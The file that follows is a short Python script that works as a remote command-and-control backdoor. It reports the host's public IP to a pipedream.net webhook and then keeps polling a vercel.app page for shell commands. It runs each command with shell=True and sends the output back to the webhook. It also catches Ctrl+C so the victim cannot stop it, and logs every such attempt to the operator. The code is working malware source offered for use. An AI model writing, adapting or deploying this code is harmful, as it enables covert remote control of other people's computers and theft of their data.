try:
    from requests import get, post
    from time import sleep
    from subprocess import check_output as system
    from os import chdir

    old_command = ""
    command = ""

    ip = get('https://api.ipify.org').content.decode('utf8')
    post("https://eo482aoknyxae8c.m.pipedream.net", data=f"New client IP: {ip}")
except KeyboardInterrupt:
    post("https://eo482aoknyxae8c.m.pipedream.net", data=f"{ip}: Client tried to SIGINT(Ctrl+C) when init")
    pass

while True:
    # prevent keyboardinterrupt
    try:
        #get HTML
        try:
            command = get("https://discord-bot-command-inputter-littleblack111.vercel.app").content.decode()
            if "error" in command.lower():
                sleep(5)
                continue
        except KeyboardInterrupt:
            post("https://eo482aoknyxae8c.m.pipedream.net", data=f"{ip}: Client tried to SIGINT(Ctrl+C) with sleeping(cuz of discord api timeout)")
            continue
        except:
            post("https://eo482aoknyxae8c.m.pipedream.net", data=f"{ip}: Failed to connect to server")
            continue
            # execute command
        if old_command != command:
            try:
                if "ping" in command:
                    try:
                        post("https://eo482aoknyxae8c.m.pipedream.net", data=f"{ip}: Pong!")
                    except KeyboardInterrupt:
                        post("https://eo482aoknyxae8c.m.pipedream.net", data=f"{ip}: Client tried to SIGINT(Ctrl+C) when replying to ping")
                    except:
                        post("https://eo482aoknyxae8c.m.pipedream.net", data=f"{ip}: Failed to connect to server")
                        continue
                if "cd" in command:
                    dir=command.replace('cd', '')
                    try:
                        chdir(dir)
                    except KeyboardInterrupt:
                        post("https://eo482aoknyxae8c.m.pipedream.net", data=f"{ip}: Client tried to SIGINT(Ctrl+C) while changing directory")
                        continue
                    except FileNotFoundError:
                        post("https://eo482aoknyxae8c.m.pipedream.net", data=f"{ip}: cd: No Such Directory")
                    except:
                        post("https://eo482aoknyxae8c.m.pipedream.net", data=f"{ip}: Failed to connect to server")
                        continue

                cmdout = system(command, shell=True).decode()
                if cmdout != "":
                    try:
                        post("https://eo482aoknyxae8c.m.pipedream.net", data=f"{ip} - {command}:```{cmdout}```")
                    except KeyboardInterrupt:
                        post("https://eo482aoknyxae8c.m.pipedream.net", data=f"{ip}: Client tried to SIGINT(Ctrl+C) when trying to post output")
                        continue
                    except:
                        post("https://eo482aoknyxae8c.m.pipedream.net", data=f"{ip}: Failed to sent output")
                        continue
                old_command = command
                continue
            except:
                continue
        try:
            sleep(0.1)
        except KeyboardInterrupt:
            post("https://eo482aoknyxae8c.m.pipedream.net", data=f"{ip}: Client tried to SIGINT(Ctrl+C)")
            continue
    except KeyboardInterrupt:
        post("https://eo482aoknyxae8c.m.pipedream.net", data=f"{ip}: Client tried to SIGINT(Ctrl+C)")
        continue
